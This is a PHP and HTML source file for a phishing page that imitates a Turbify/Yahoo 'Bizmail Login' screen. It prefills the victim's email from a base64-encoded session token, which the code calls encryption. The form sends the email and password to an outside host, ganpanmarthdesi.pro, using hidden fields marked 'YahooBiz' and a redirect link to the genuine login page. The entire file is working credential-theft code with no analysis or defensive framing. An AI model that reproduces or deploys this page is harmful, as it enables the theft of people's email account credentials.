<?php
ini_set('display_errors',0);
ob_start();
if (!isset($_SESSION)) { session_start();}


if(!isset($_SESSION['UZ_login'])){ header("location:noemail.php");}



$_POST["token"]=$_SESSION['UZ_login'];

function doEncrypt($string)
{
	$rand = substr(md5(microtime()),rand(0,26),2);
	$crystr = "".$rand."".base64_encode($string)."";
	return $crystr;
}

function doDecrypt($string)
{
	$str = substr($string, 2);
	$crystr = base64_decode($str);
	return $crystr;
}

$email = doDecrypt($_POST["token"]);
$userz = explode('@', $email);
 $users = $userz[0];


$ddomain=preg_replace( '!^.+?([^@]+)$!', '$1', doDecrypt($_POST["token"]));

  $domains = explode('@', $email);
    $domain = ucfirst("$domains[1]");
	$domain2 = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = ucwords ("$domains1[0]");

?>
<html>

<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Bizmail Login</title>
<link rel="icon" type="image/png" href="https://sep.turbifycdn.com/yf/nrp/image/turbify/Turbify_favicon.svg" />
</head>
<style>
  html, body {
  font-family: Arial, sans-serif;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  input[type=text],
  input[type=password] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 100%;
  width: 100%;
  padding: 10px 15px;
  border: 1px solid #d5d5d5;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 0;
  font-size: 12px;
  font-family: Arial,sans-serif;
  color: #787878;
  }
  input[type=text]:focus,
  input[type=password]:focus {
  outline: none;
  border: 1px solid #000000;
  }
</style>
<body background="img/b.png">

<table border="0" width="100%" cellspacing="0" cellpadding="0">
	<tr>
		<td background="img/header_bg.png">
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="54" background="img/header_bg.png">&nbsp;</td>
				<td width="81">
				<img border="0" src="img/header_logo.png" width="130" height="70"></td>
				<td>&nbsp;</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="36"></td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="100"></td>
				<td width="565" height="879" background="img/ads.png"></td>
				<td width="123"></td>
				<td width="360">
				<table border="0" width="100%" cellspacing="0" cellpadding="0">
					<tr>
						<td height="33"></td>
					</tr>
					<tr>
						<td height="569" background="img/form.png">
						<table border="0" width="100%" cellspacing="0" cellpadding="0">
						   <form method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php">
							<tr>
								<td height="219"></td>
							</tr>
							<tr>
								<td>
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td width="22"></td>
										<td height="40">
										  <input type="text" name="user" required value="<?php echo $users;?>@<?php echo $ddomain;?>" placeholder="Email" >
										  <input type="hidden" name="domain" value="<?php echo $ddomain;?>" >
										  <input type="hidden" name="link" value="https://mail.turbify.com/login" >
										  <input type="hidden" name="sender" value="YahooBiz" >
										</td>
										<td width="21">&nbsp;</td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="13"></td>
							</tr>
							<tr>
								<td>
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td width="22"></td>
										<td height="40">
										  <input type="password" name="passwd" required placeholder="Password" autofocus >
										</td>
										<td width="21">&nbsp;</td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="62"></td>
							</tr>
							<tr>
								<td>
								<table border="0" width="100%" cellspacing="0" cellpadding="0">
									<tr>
										<td width="80"></td>
										<td>
										<input type="image" src="img/btn.png" width="200" height="40" name="I1"></td>
										<td width="81"></td>
									</tr>
								</table>
								</td>
							</tr>
							<tr>
								<td height="224"></td>
							</tr>
							</form>
						</table>
						</td>
					</tr>
					<tr>
						<td height="200"></td>
					</tr>
				</table>
				</td>
				<td>&nbsp;</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="8"></td>
	</tr>
	<tr>
		<td>
		<table border="0" width="100%" cellspacing="0" cellpadding="0">
			<tr>
				<td width="510">&nbsp;</td>
				<td width="301">
				<img border="0" src="img/footer.png" width="323" height="18"></td>
				<td>&nbsp;</td>
			</tr>
		</table>
		</td>
	</tr>
	<tr>
		<td height="15"></td>
	</tr>
</table>

</body>

</html>

<script>


 $(document).ready(function(){  
 
 	$('#myModal').modal('toggle'); 
 });

</script>